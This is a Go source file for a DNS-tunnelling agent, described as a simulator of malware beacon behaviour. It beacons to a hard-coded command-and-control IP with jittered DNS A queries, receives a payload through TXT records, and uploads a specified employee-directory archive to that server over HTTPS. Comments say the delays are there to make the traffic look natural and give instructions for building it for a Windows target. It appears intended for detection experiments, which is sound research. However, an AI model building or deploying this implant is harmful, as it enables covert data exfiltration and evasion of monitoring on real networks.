// DNS Tunnel Agent - Simulates malware beacon behavior
//
// This agent demonstrates DNS-based C2 communication:
//  1. Beacons via A record queries every 4-6 minutes
//  2. Interprets response IP to determine if job exists
//  3. If job: switches to TXT queries to receive payload
//  4. After TXT complete: uploads file via HTTPS
//  5. Returns to beaconing
//
// ROUTING BEHAVIOR:
//   - A record beacons: Go through local resolver (when DirectMode=false)
//   - TXT record transfer: ALWAYS direct to C2 (bypass caching)
//   - HTTPS upload: Direct to C2
//
// USAGE:
//  1. Configure variables below
//  2. Cross-compile for Windows: GOOS=windows GOARCH=amd64 go build -o agent.exe ./cmd/agent
//  3. Run on Windows target
package main

import (
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"motd_joker_screenmate/internal/dns"
	"motd_joker_screenmate/internal/https"
	"motd_joker_screenmate/internal/protocol"
)

// =============================================================================
// CONFIGURATION - Modify these variables for your environment
// =============================================================================

var (
	// Domain is the base domain for DNS queries.
	Domain = "timeserversync.com"

	// C2ServerIP is the IP address of the C2 server.
	// Used for:
	//   - HTTPS connection
	//   - TXT queries (always direct)
	//   - A queries (when DirectMode=true)
	C2ServerIP = "48.217.188.16"

	// DirectMode controls A record query routing:
	//   true  = A queries go directly to C2 (for testing)
	//   false = A queries go through local resolver (for experiment)
	//
	// NOTE: TXT queries ALWAYS go direct to C2 regardless of this setting.
	DirectMode = false

	// DNSResolver is the local DNS resolver for A queries when DirectMode=false.
	// Examples: "192.168.1.1:53", "10.0.0.1:53", "8.8.8.8:53"
	DNSResolver = "192.168.2.1:53"

	// BeaconInterval is the base time between A record check-ins (seconds).
	// Default: 300 (5 minutes)
	BeaconInterval = 300

	// Jitter is the ± randomization applied to BeaconInterval (seconds).
	// Default: 60 (results in 4-6 minute range)
	Jitter = 120

	// HTTPSPort is the port for direct HTTPS connection to C2.
	HTTPSPort = 8443

	// ExfilFilePath is the file to upload to the C2 after TXT transfer.
	ExfilFilePath = `C:\Users\tresa\OneDrive\Desktop\employees_dir.zip`

	// TXTQueryDelayMs is the delay between TXT queries (milliseconds).
	// A small delay makes the traffic look more natural.
	TXTQueryDelayMs = 1500 // 1.5 seconds
)

// Global flag for graceful shutdown
var running = true

func main() {
	printBanner()

	// Set up graceful shutdown
	go handleShutdown()

	// Determine target for A queries
	var aTarget string
	if DirectMode {
		aTarget = C2ServerIP + ":53"
	} else {
		aTarget = DNSResolver
	}

	// TXT queries ALWAYS go direct to C2
	txtTarget := C2ServerIP + ":53"

	// Create DNS client with separate targets for A and TXT
	dnsClient := dns.NewClient(aTarget, txtTarget, Domain)

	// Create HTTPS client for file uploads
	httpsClient := https.NewClient(C2ServerIP, HTTPSPort)

	// Main beacon loop
	log.Println("[AGENT] Starting beacon loop...")
	log.Println("[AGENT] ─────────────────────────────────────────────")

	for running {
		// Perform A record check-in
		log.Println("[BEACON] Sending A record query...")
		isJob, err := dnsClient.Beacon()

		if err != nil {
			log.Printf("[BEACON] Query failed: %v", err)
			sleepWithJitter()
			continue
		}

		if isJob {
			log.Println("[BEACON] ═══════════════════════════════════════════")
			log.Println("[BEACON] JOB RECEIVED! Switching to TXT transfer mode...")
			log.Println("[BEACON] ═══════════════════════════════════════════")

			// Perform TXT transfer (direct to C2)
			receiveTXTPayload(dnsClient)

			// Perform HTTPS upload
			log.Println("[AGENT] TXT transfer complete. Starting HTTPS exfiltration...")
			performHTTPSExfil(httpsClient)

			log.Println("[AGENT] ═══════════════════════════════════════════")
			log.Println("[AGENT] Exfiltration complete. Resuming beacon cycle...")
			log.Println("[AGENT] ═══════════════════════════════════════════")
		} else {
			log.Println("[BEACON] No job pending.")
		}

		// Sleep with jitter before next beacon
		sleepWithJitter()
	}

	log.Println("[AGENT] Shutdown complete.")
}

func printBanner() {
	banner := `
╔═══════════════════════════════════════════════════════════════════╗
║           DNS TUNNEL AGENT - Joker Screenmate Simulator           ║
╠═══════════════════════════════════════════════════════════════════╣
║  Domain:          %-48s ║
║  C2 Server:       %-48s ║
║  Direct Mode:     %-48v ║
║  DNS Resolver:    %-48s ║
║  Beacon Interval: %-48s ║
║  HTTPS Port:      %-48d ║
║  Exfil File:      %-48s ║
╚═══════════════════════════════════════════════════════════════════╝
`
	intervalStr := fmt.Sprintf("%d ± %d seconds (%d-%d min range)",
		BeaconInterval, Jitter,
		(BeaconInterval-Jitter)/60, (BeaconInterval+Jitter)/60)

	fmt.Printf(banner,
		Domain,
		C2ServerIP,
		DirectMode,
		DNSResolver,
		intervalStr,
		HTTPSPort,
		ExfilFilePath,
	)

	// Show routing info
	fmt.Println()
	if DirectMode {
		log.Printf("[CONFIG] A queries:   %s:53 (DIRECT TO C2)", C2ServerIP)
	} else {
		log.Printf("[CONFIG] A queries:   %s (via local resolver)", DNSResolver)
	}
	log.Printf("[CONFIG] TXT queries: %s:53 (ALWAYS DIRECT TO C2)", C2ServerIP)
	log.Printf("[CONFIG] HTTPS:       %s:%d (DIRECT TO C2)", C2ServerIP, HTTPSPort)
	fmt.Println()
}

// handleShutdown listens for shutdown signals.
func handleShutdown() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	sig := <-sigChan
	log.Printf("[AGENT] Received signal %v, shutting down gracefully...", sig)
	running = false
}

// receiveTXTPayload queries TXT records in a loop until transfer is complete.
func receiveTXTPayload(client *dns.Client) {
	log.Println("[TXT] Starting payload transfer (direct to C2, subdomain: verify)...")

	chunksReceived := 0
	totalBytes := 0
	startTime := time.Now()

	for running {
		// Query for next TXT record (goes direct to C2)
		txtValue, isEmpty, err := client.QueryTXT()

		if err != nil {
			log.Printf("[TXT] Query error: %v", err)
			time.Sleep(time.Duration(TXTQueryDelayMs) * time.Millisecond)
			continue
		}

		// Check for end of transfer (empty TXT record)
		if isEmpty {
			elapsed := time.Since(startTime)
			log.Println("[TXT] ─────────────────────────────────────────────")
			log.Printf("[TXT] Transfer complete!")
			log.Printf("[TXT] Received %d chunks, ~%d bytes in %v", chunksReceived, totalBytes, elapsed)
			log.Println("[TXT] ─────────────────────────────────────────────")
			return
		}

		// Parse the chunk (sequence number + base64 data)
		seqNum, payload, err := protocol.ParseChunk(txtValue)
		if err != nil {
			log.Printf("[TXT] Failed to parse chunk: %v", err)
			time.Sleep(time.Duration(TXTQueryDelayMs) * time.Millisecond)
			continue
		}

		chunksReceived++
		totalBytes += len(payload)

		// Log progress: first 5 chunks, then every 50 chunks
		if chunksReceived <= 5 || chunksReceived%50 == 0 {
			log.Printf("[TXT] Received chunk %d (seq=%d, %d bytes, total=%d bytes)",
				chunksReceived, seqNum, len(payload), totalBytes)
		}

		// Small delay between queries to look more natural
		time.Sleep(time.Duration(TXTQueryDelayMs) * time.Millisecond)
	}
}

// performHTTPSExfil uploads the configured file to the C2 server.
func performHTTPSExfil(client *https.Client) {
	log.Printf("[HTTPS] Preparing to upload: %s", ExfilFilePath)

	// Check if file exists
	if _, err := os.Stat(ExfilFilePath); os.IsNotExist(err) {
		log.Printf("[HTTPS] File not found: %s", ExfilFilePath)
		log.Println("[HTTPS] Skipping exfiltration.")
		return
	}

	// Check if C2 is reachable
	if err := client.CheckConnection(); err != nil {
		log.Printf("[HTTPS] C2 server not reachable: %v", err)
		log.Println("[HTTPS] Skipping exfiltration, will retry next job cycle.")
		return
	}

	// Upload the file
	if err := client.UploadFile(ExfilFilePath); err != nil {
		log.Printf("[HTTPS] Upload failed: %v", err)
		log.Println("[HTTPS] Exfiltration failed, will retry next job cycle.")
		return
	}

	log.Println("[HTTPS] Exfiltration successful!")
}

// sleepWithJitter pauses execution for BeaconInterval ± Jitter seconds.
func sleepWithJitter() {
	base := time.Duration(BeaconInterval) * time.Second
	jitter := time.Duration(Jitter) * time.Second

	sleepDuration := protocol.CalculateJitter(base, jitter)

	log.Printf("[AGENT] Sleeping for %v (next beacon at %s)",
		sleepDuration.Round(time.Second),
		time.Now().Add(sleepDuration).Format("15:04:05"))
	time.Sleep(sleepDuration)
}
